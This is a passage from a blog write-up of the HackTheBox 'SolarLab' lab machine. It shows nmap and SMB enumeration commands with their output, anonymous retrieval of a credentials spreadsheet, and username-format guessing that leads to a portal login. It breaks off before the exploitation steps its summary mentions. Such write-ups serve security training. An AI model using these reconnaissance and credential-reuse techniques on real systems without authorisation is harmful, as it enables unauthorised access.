<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>HTB Machine — SolarLab&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="HTB Machine — SolarLab">
  
    <meta name="description" content="Happy new year! It’s been a while since I last posted, as life got in the way. I’m hoping to get back to posting more regularly this year. This machine is centred around abusing passwords. It starts with a public SMB share exposing a password-harvested excel file, one of which can be used to log in to the employee portal. The web app uses a vulnerable library to generate PDF files, which can also be abused to get a shell. Privilege escalation is all about enumerating OpenFire and once again abusing some stored credentials.">
    <meta property="og:description" content="Happy new year! It’s been a while since I last posted, as life got in the way. I’m hoping to get back to posting more regularly this year. This machine is centred around abusing passwords. It starts with a public SMB share exposing a password-harvested excel file, one of which can be used to log in to the employee portal. The web app uses a vulnerable library to generate PDF files, which can also be abused to get a shell. Privilege escalation is all about enumerating OpenFire and once again abusing some stored credentials.">
  
  
    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/a2c2bd7b4e98ff8b782ed590896305a1.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://github.com/ch3ng625", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
      <span>GitHub</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
      <span>LinkedIn</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
      <span>HackTheBox</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/a2c2bd7b4e98ff8b782ed590896305a1.png"></span>
      </div>
    
    <h1 class="Header__Title">HTB Machine — SolarLab</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Fri, Jan 3, 2025</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/HTB">HTB</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
            <a href="tag/Windows">Windows</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/Medium">Medium</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/1700b98a88f78022a228c8a69c61b67d" class="PageRoot"><h3 id="https://www.notion.so/1700b98a88f7806a8cebcd4c1a1e336f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1700b98a88f7806a8cebcd4c1a1e336f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1700b98a88f7805aaf1cf568b79e4d6d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Happy new year! It’s been a while since I last posted, as life got in the way. I’m hoping to get back to posting more regularly this year. This machine is centred around abusing passwords. It starts with a public SMB share exposing a password-harvested excel file, one of which can be used to log in to the employee portal. The web app uses a vulnerable library to generate PDF files, which can also be abused to get a shell. Privilege escalation is all about enumerating OpenFire and once again abusing some stored credentials.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78046b92dcbb40b701f32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780e48f07c20cbe73d0c8" class="Divider"></div><h3 id="https://www.notion.so/1700b98a88f780e6b64cc6142820a418" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1700b98a88f780e6b64cc6142820a418"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/1700b98a88f780b3ad25e0f9ad01b9df" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/1700b98a88f780fcb6bae52975b61b93" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.213.44 -oA tcp_all_ports/results

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 18:06 ACST
Nmap scan report for 10.129.213.44
Host is up (0.33s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
6791/tcp open  hnm

Nmap done: 1 IP address (1 host up) scanned in 133.54 seconds

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 80,135,139,445,6791 10.129.213.44 -oA aggressive/tcp   

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 18:14 ACST
Nmap scan report for 10.129.213.44
Host is up (0.33s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          nginx 1.24.0
|_http-server-header: nginx/1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6791/tcp open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
|_http-server-header: nginx/1.24.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-12T08:45:35
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   331.77 ms 10.10.14.1
2   331.85 ms 10.129.213.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.60 seconds</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780a8b0f6e96b47899656" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nmap</code></span><span class="SemanticString"> discovered SMB, RPC and two web ports. By this look it doesn’t seem to be AD-related. The scan also found its domain name and a subdomain. I’ll add both to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/1700b98a88f7804dad2df5c00d15028e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/1700b98a88f780608938ff23a42ad25f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine SolarLab</span>
<span class="token number">10.129</span>.213.44   solarlab.htb   report.solarlab.htb</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7807db09ae6c0dae63774" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780328adecf74af3ce183" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f780249b56cc4bb6988568" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8ea750a2-46ad-429f-bd82-7bb7f7b1455e%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8024-9b56-cc4bb6988568"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8ea750a2-46ad-429f-bd82-7bb7f7b1455e%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8024-9b56-cc4bb6988568" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780058635ed1bb455623d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The home page shows a “coming soon” countdown, as seen already in several other HTB boxes. The countdown resets when the page is reloaded.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7802da91eeb95056b75b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780908089e0f47d0a57c3" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fda1a5797-de74-4fcb-911c-ec5129a28773%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8090-8089-e0f47d0a57c3"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fda1a5797-de74-4fcb-911c-ec5129a28773%2FUntitled.png?width=707.984375&amp;table=block&amp;id=1700b98a-88f7-8090-8089-e0f47d0a57c3" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780ddbee9febff200b721" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">“About us” lists three employees, which could be potential usernames. But aside from this, the site doesn’t have any other useful functions or information.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780d3806adb787718a510" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780a182f7c1fb832e3222" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP445 — SMB:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f780c4abdbd0b4f8d2054d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With no leads from the website, I’ll check out the SMB share. Surprisingly, anonymous access is enabled, and the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Documents</code></span><span class="SemanticString"> share can be read.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780059f16d62febf99ea7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> crackmapexec smb 10.129.213.44 -u &#x27;Anonymous&#x27; -p &#x27;&#x27; --shares

SMB         10.129.213.44   445    SOLARLAB         [*] Windows 10.0 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.213.44   445    SOLARLAB         [+] solarlab\Anonymous: 
SMB         10.129.213.44   445    SOLARLAB         [+] Enumerated shares
SMB         10.129.213.44   445    SOLARLAB         Share           Permissions     Remark
SMB         10.129.213.44   445    SOLARLAB         -----           -----------     ------
SMB         10.129.213.44   445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.129.213.44   445    SOLARLAB         C$                              Default share
SMB         10.129.213.44   445    SOLARLAB         Documents       READ            
SMB         10.129.213.44   445    SOLARLAB         IPC$            READ            Remote IPC</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780079d02fe5c878b71e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f78006ab76f892ec2c7580" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll connect to the share with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">smbclient</code></span><span class="SemanticString">. The presence of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">My Music</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">My Pictures</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">My Videos</code></span><span class="SemanticString"> suggests this is a user’s home directory. Additionally, there’s also a Word document, an Excel file, and a folder named </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">concepts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f7805fba16f50699a3fe07" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/solarlab]
└─$</span></mark></span><span class="SemanticString"><span> smbclient -U &#x27;Anonymous&#x27; -N \\\\10.129.213.44\\Documents

Try &quot;help&quot; to get a list of possible commands.
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \&gt;</span></mark></span><span class="SemanticString"><span> dir

  .                                  DR        0  Sat Apr 27 00:17:14 2024
  ..                                 DR        0  Sat Apr 27 00:17:14 2024
  concepts                            D        0  Sat Apr 27 00:11:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 21:24:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 22:57:21 2023
  My Music                        DHSrn        0  Fri Nov 17 06:06:51 2023
  My Pictures                     DHSrn        0  Fri Nov 17 06:06:51 2023
  My Videos                       DHSrn        0  Fri Nov 17 06:06:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 21:05:57 2023

		7779839 blocks of size 4096. 1889403 blocks available</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f780849614eb24c2939c19" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7804a9520c70d01df5f29" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s two more word documents in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">concepts</code></span><span class="SemanticString"> folder. I’ll download all of them.</span></span></p></div><pre id="https://www.notion.so/1700b98a88f780098ca4c1ff98577b29" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>smb: \concepts\&gt;</span></mark></span><span class="SemanticString"><span> dir
  .                                   D        0  Sat Apr 27 00:11:57 2024
  ..                                  D        0  Sat Apr 27 00:11:57 2024
  Training-Request-Form.docx          A   161337  Fri Nov 17 21:16:57 2023
  Travel-Request-Sample.docx          A    30953  Fri Nov 17 21:06:54 2023

		7779839 blocks of size 4096. 1889403 blocks available</span></span></span></code></pre><div id="https://www.notion.so/1700b98a88f7805fb526de6fb9b20f4a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7803b9385d9f2e9bb0bac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The word documents are just empty templates that don’t have anything useful. However, the Excel file turns out to be a detailed list of user login information, containing plaintext credentials and even answers for security questions. This is quite possibly the worst approach for credential management.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780868e40e587f584b6fb" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb5a5cd9a-d944-4564-89ba-b4237de9b949%2FUntitled.png?width=708&amp;table=block&amp;id=1700b98a-88f7-8086-8e40-e587f584b6fb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fb5a5cd9a-d944-4564-89ba-b4237de9b949%2FUntitled.png?width=708&amp;table=block&amp;id=1700b98a-88f7-8086-8e40-e587f584b6fb" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f7801baafdef93c36457ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll note all of them down and check out the other web port.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78006819ac451537d4bae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f7800d95f3f2b922196a27" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP6791 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f78020997ff638f4e3f61f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The site redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">report.solarlab.htb</code></span><span class="SemanticString">, and shows a login page.</span></span></p></div><div id="https://www.notion.so/1700b98a88f7802495a3df86041ac19c" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa15eeedb-8082-4da9-bcaa-a788205cb6c4%2FUntitled.png?width=644&amp;table=block&amp;id=1700b98a-88f7-8024-95a3-df86041ac19c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa15eeedb-8082-4da9-bcaa-a788205cb6c4%2FUntitled.png?width=644&amp;table=block&amp;id=1700b98a-88f7-8024-95a3-df86041ac19c" style="width:644px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780baac1cf3f6396ba0aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780eda4f1cd9066932909" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The obvious thing to do is to try every credentials found in the Excel file, however none of them work. It’s interesting to note that the web app tells you whether the account is valid or not. Most attempts resulted in “user not found”:</span></span></p></div><div id="https://www.notion.so/1700b98a88f780d086eef82993acd348" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc43d59ae-7f27-4bbf-9ba7-cf9fa0c4512d%2FUntitled.png?width=491&amp;table=block&amp;id=1700b98a-88f7-80d0-86ee-f82993acd348"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc43d59ae-7f27-4bbf-9ba7-cf9fa0c4512d%2FUntitled.png?width=491&amp;table=block&amp;id=1700b98a-88f7-80d0-86ee-f82993acd348" style="width:491px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780e0aeafd3fed7ff8d71" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780e0ac42ff66f902461c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">AlexanderK</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ClaudiaS</code></span><span class="SemanticString"> resulted in a different message:</span></span></p></div><div id="https://www.notion.so/1700b98a88f780f6a88ed0192b2a7bfb" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc40ca8ec-a4d4-4d5c-8535-831bd4294343%2FUntitled.png?width=472&amp;table=block&amp;id=1700b98a-88f7-80f6-a88e-d0192b2a7bfb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc40ca8ec-a4d4-4d5c-8535-831bd4294343%2FUntitled.png?width=472&amp;table=block&amp;id=1700b98a-88f7-80f6-a88e-d0192b2a7bfb" style="width:472px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780d386acd00a77effd6d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780f6a699e089c5b8de01" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This hinted that the naming convention is the user’s first name followed by the initial of their last name. By this logic, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">blake.byte</code></span><span class="SemanticString"> would become </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">BlakeB</code></span><span class="SemanticString">. Using this new username format, I’ll retry Blake’s credentials, and logs in successfully.</span></span></p></div><div id="https://www.notion.so/1700b98a88f780dda3f6c6d3004a84ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780eaa1b5d0908828979e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ReportHub Employee Portal:</strong></span></span></p></div><div id="https://www.notion.so/1700b98a88f780d58236e5e01db539bc" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9ba6293a-51a6-429f-b4a7-8eb8e305b26a%2FUntitled.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-80d5-8236-e5e01db539bc"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F9ba6293a-51a6-429f-b4a7-8eb8e305b26a%2FUntitled.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-80d5-8236-e5e01db539bc" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f78097aef0c9bac88dbd1c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f78064b25ad280e98fe7ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The application is an employee portal that allows users to submit 4 different types of requests. Each of them uses a similar template form with several basic fields, a rich text editor, and an option to upload signature images.</span></span></p></div><div id="https://www.notion.so/1700b98a88f78072b04cef7a4ca72aff" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F30ad153f-618f-4812-a9f4-601799cfd4d5%2FUntitled.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-8072-b04c-ef7a4ca72aff"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F30ad153f-618f-4812-a9f4-601799cfd4d5%2FUntitled.png?width=707.96875&amp;table=block&amp;id=1700b98a-88f7-8072-b04c-ef7a4ca72aff" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1700b98a88f780df88f1d9b87c37c144" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1700b98a88f780479507c02082cc273e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I completed the form with dummy 